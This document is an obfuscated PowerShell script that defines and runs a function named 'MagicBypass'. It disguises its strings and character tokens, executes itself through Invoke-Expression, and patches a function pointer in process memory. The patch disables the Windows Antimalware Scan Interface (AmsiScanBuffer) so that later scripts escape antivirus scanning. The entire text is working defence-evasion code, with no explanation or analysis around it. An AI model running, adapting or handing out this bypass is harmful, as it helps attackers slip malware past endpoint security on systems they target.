.( $env:ComspEc[4,24,25]-joIN'') ( (('function MagicBypass {
    param(
        jFCIni'+'tialStart = 0x50000,'+'
        jFCNegativeOffset ='+' 0x50000,
   '+'     '+'jFCMaxOffset = 0x1000000,'+'
        jFCReadBytes = 0x50000
'+'    )

    jFCAP'+'Is = @6wf
usi'+'ng'+' System;
using'+' System.Compo'+'nentModel;
using System.Management.Automation;
using'+' System.Reflection;
using Syste'+'m.Runtime.Com'+'pilerService'+'s;
using System.Runtime.'+'InteropServ'+'ices;
using'+' System.T'+'ext;

pu'+'blic class APIs {
    [DllImport(6wfkernel32.dll6wf)]
    public '+'static extern boo'+'l ReadProcessMemory(IntPtr hP'+'rocess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref'+' UInt32 lp'+'Num'+'ber'+'OfBytesRead);

    [DllImpo'+'rt(6wfkernel32.dll6wf)]
    public static exte'+'rn IntPtr GetCurrentProce'+'ss();

    [DllImport(6wfkernel326wf, Cha'+'rSet=CharSet.Ansi, ExactSpe'+'lling=true, SetLastErr'+'or=true)]
    public st'+'atic extern IntPtr GetProcAddress(IntPtr hModule, string '+'procName);
   
    [DllImport(6wfkernel'+'3'+'2.dll6wf, CharSet=Char'+'Set.Auto)]
    public static extern IntPtr GetModuleHandle([Mars'+'halAs(UnmanagedType.LPWStr)] string lpModuleName);

    '+'[MethodImpl(MethodImplOptio'+'ns.NoOptimization '+'V4j MethodImplOpti'+'ons.NoInlining)]'+'
    public s'+'tatic i'+'nt Dummy() {
        return 1;
 '+'   }'+'
}'+'
6wf@

    Add-Type jFCAPIs

'+'    jFCInitialDate = Get-Date

    jFCstring = mryhello, worldmry
    jFCstring = jFCst'+'ring.re'+'place(mryhemry,mryamry'+')
    jFCstring = jFCstring.replace(mr'+'yllmry,mrymmry)
    jFCstring = jFCstr'+'ing.repla'+'ce(mryo,mr'+'y,mrysmry)
    jFCstring = jFCstring.replace(mry mry,mryimry)
    jFCstring = jFCstring.replace(mrywomry,mry.dmry)
    jFCstrin'+'g = jFCstring.replace(mryrldmry,mryllmry)

    jFCstrin'+'g2 = mryhello, worldmry
    jFCstring2 = jFCstring2.replace(mryhemry,'+'mryAmry)
    jFCstring2 = '+'jFCstring2.replace(mryllmry,mrymmry)
    jFCstring2 = jFCst'+'ring2.replace(mryo,mry,mrysmry)
    jFCstring2 = jFCstring2.r'+'eplace(mry mry,mryimry)
    j'+'FCstring2 = jFC'+'string2.replace(mrywomry,m'+'ryS'+'cmry)
    jFCstring2 = jFCstring2.replace(mryrldmry,mryan'+'mry)

    jFCstring3 = m'+'ryhello, worldmry
    jFCstring3 = j'+'FCstring3.repl'+'ace(mryhellomry,mryBumry)
    jFCstring3 = jFCstring3.replace(mry, mry,mryffmry)
    jFCstring3 = jFCstring3.replace(mryworldmry,mryermry)

    jFCAddress = [APIS]::GetModuleHandle(jFCst'+'ring)
    [IntPtr] jFCfu'+'ncAddr'+' = [APIS]::GetProcAddress(jFCAddress, jFCstring2 + jFCstring3)

    jFCAssemblies = [appdomain]::currentdomain.getassemblies()
    jFCAssemblies V4j
        ForEach-Object {
            if(jFC_.Location -ne jFCnull){
           '+'  '+'   jFCsplit1 = jFC_.FullName.Split(6wf,'+'6wf)[0]'+'
               '+' If(jFCsplit1.StartsW'+'ith(mrySmry) -And jFCsplit1.EndsWith(mrynmry) -And jFCsplit1.Length -eq 28) {
          '+'          jFCTypes = jFC_.GetTypes()
               '+' }
            }
        }

    jFCTypes V4'+'j
        ForEach-Object {
            if(jFC_.Name -ne jFCnu'+'ll){
       '+'         If(jFC_.Name.StartsWith'+'(mryAmry) -And jFC_.Name'+'.EndsWith'+'(mrysmry) -And jFC_.Name.L'+'ength -eq 9) {'+'
  '+'                  jFCMethods ='+' jFC_.GetMethods([System.Reflectio'+'n.Bi'+'ndin'+'gFlags]mryStatic,NonPublicmry)
                }
            }
        }

    jFCMethods V4j
        ForEac'+'h-Object {
            if(jFC_.Name -ne jFCnull){
    '+'            If(jFC_.Name.StartsWith(mrySmry) -And jFC_.Name.EndsWith(m'+'rytmry) -And j'+'FC_.Name.Length -eq 11) {
                   '+' j'+'FCMethodFound = '+'jFC_
       '+'         }
            }
        }

    [IntPtr] jFCMeth'+'odPointer = jFCMethodFound.Met'+'hodHandle.Get'+'FunctionPoin'+'ter()
    [IntPtr'+'] jFCHandle = [API'+'s]::GetCurrentProces'+'s()
    jFCd'+'ummy = 0
    jFCApiReturn = jF'+'Cfalse

    :initialloop
    for(jFCj = jFCInit'+'ialStart; jFCj -lt jFCMax'+'Offset; jFCj += jFCNegativeOffset){
        [IntPtr] jFCMetho'+'dPointerToSearch = [Int64] jFCMethodPointer - jFCj
        jFCReadedMemoryArray = [byte[]]::new(jFCRe'+'adBytes)
        jFCApiReturn = [APIs]::ReadProcessMemory(jF'+'CHandle, jFC'+'MethodPointerToSearch, jFCReadedMemoryArray, jFCReadBytes,[ref]jFCdummy)
        for (jFCi = 0; jFCi -lt jFC'+'ReadedMemoryAr'+'ray.Leng'+'th; jFCi += 1) {
            jFCbytes = [byte[]](jFCReadedMemoryArray[jFCi], jFCRe'+'adedMemoryArray[jFCi + 1], jFCReadedMemoryArray[jFCi + 2], jFCReadedMemoryArray[jFCi + 3], jFCReadedMemoryArray[jFCi + 4], jFCReadedMemoryArray[jFCi + 5], jFCReadedMemoryArray[jFCi + 6], jFC'+'ReadedMemoryArray[jFCi + 7])
      '+'      [IntPtr] jFCPointer'+'ToCompare = [bitconverter]::ToIn'+'t64(jFCbytes,0)'+'
            if (jFCPointerToCompa'+'r'+'e -eq jFCf'+'uncAddr) {
               '+' Write-Hos'+'t 6w'+'fFound @ jFC(jFCi)!6wf
  '+'             '+' [IntPtr]'+' jFCMemoryToPatch = [Int64] '+'jFC'+'M'+'ethodPointerToSearch +'+' jFCi
                br'+'eak'+' initial'+'loop
  '+'          }
   '+'     }
    }

    [IntPtr] jFCDummyPoin'+'ter = [APIs].GetMethod(mryDummy'+'mry).MethodHandle.GetFunctionPointer()
    jFCbuf = [IntPtr[]] (jFCDummyPointer)
    [System.Runtime.InteropServices.Marshal]::Copy(jFCbuf, 0, jFCMemoryToPatch, 1)

    jFCFinishDate = Get-Date
    j'+'FCTimeElapsed = '+'(jFCFinishD'+'ate - jFCInitialDate).TotalSeconds
    Write-Host 6wfjFCTim'+'eElapsed seconds6wf
}
') -ReplacE'mry',[cHAr]39  -ReplacE([cHAr]54+[cHAr]119+[cHAr]102),[cHAr]34-cREplaCE'jFC',[cHAr]36 -cREplaCE  'V4j',[cHAr]124))